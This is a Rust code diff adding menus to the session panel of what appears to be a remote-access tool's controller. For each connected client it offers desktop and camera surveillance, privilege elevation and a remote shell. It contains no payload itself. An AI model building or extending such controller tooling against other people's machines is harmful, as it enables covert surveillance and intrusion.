@@ -1,6 +1,51 @@
-use crate::ui::view::View;
-use egui::{Align, Frame, Label, Layout, RichText, ScrollArea, Sense, TextStyle, Ui, vec2};
+use crate::{
+    manager::types::UiManagerCommand,
+    ui::{client::ClientView, view::View, windows},
+};
+use egui::{
+    Align, Frame, Id, Label, Layout, Popup, RichText, ScrollArea, Sense, TextStyle, Ui, vec2,
+};
 use egui_extras::{Column, TableBuilder};
+use shared::commands::Command;
+
+fn menu(view: &mut ClientView, ui: &mut Ui) -> () {
+    ui.menu_button("🔍  Surveillance", |ui| {
+        if ui.button("🖵  Desktop").clicked() {
+            view.state
+                .windows
+                .screen
+                .store(true, std::sync::atomic::Ordering::Relaxed);
+        };
+        if ui.button("📸  Camera").clicked() {
+            view.state
+                .windows
+                .camera
+                .store(true, std::sync::atomic::Ordering::Relaxed);
+        };
+    });
+    ui.menu_button("🗁  Utility", |ui| {
+        ui.add_enabled_ui(!view.elevated, |ui| {
+            if ui.button("🛡  Elevate").clicked() {
+                let _ = view.sender.send(UiManagerCommand::SendCommand(
+                    view.mutex.clone(),
+                    Command::Elevate,
+                )); // #ThatWasEasy
+            };
+        });
+        if ui.button("💬  MessageBox").clicked() {
+            view.state
+                .windows
+                .message_box
+                .store(true, std::sync::atomic::Ordering::Relaxed);
+        };
+        if ui.button("🗖  Shell").clicked() {
+            view.state
+                .windows
+                .shell
+                .store(true, std::sync::atomic::Ordering::Relaxed);
+        };
+    });
+}
 
 pub fn render(view: &mut View, ui: &mut Ui) -> () {
     ui.heading("Sessions");
@@ -42,12 +87,17 @@ pub fn render(view: &mut View, ui: &mut Ui) -> () {
             });
         })
         .body(|mut body| {
-            for (_i, client) in view.state.clients.iter_mut().enumerate() {
+            for (_i, mut client) in view.state.clients.iter_mut().enumerate() {
                 body.row(24.0, |mut row| {
                     row.col(|ui| {
-                        if ui.add(Label::new(client.0).sense(Sense::click())).clicked() {
-                            client.1.state.visible = !client.1.state.visible
-                        }
+                        let sense = Sense::click();
+                        let response = ui.add(Label::new(client.0).sense(sense));
+                        Popup::menu(&response)
+                            .id(Id::new("menu"))
+                            .show(|ui| menu(&mut client.1, ui));
+                        Popup::context_menu(&response)
+                            .id(Id::new("context_menu"))
+                            .show(|ui| menu(&mut client.1, ui));
                     });
                     row.col(|ui| {
                         ui.label(&client.1.info.hostname);
@@ -58,6 +108,10 @@ pub fn render(view: &mut View, ui: &mut Ui) -> () {
                 });
             }
         });
+
+    for (_i, client) in view.state.clients.iter_mut().enumerate() {
+        windows::render(client.1, ui);
+    }
 
     ui.with_layout(Layout::top_down(Align::Min), |ui| {
         let size = ui.available_size() - vec2(16.0, 16.0);
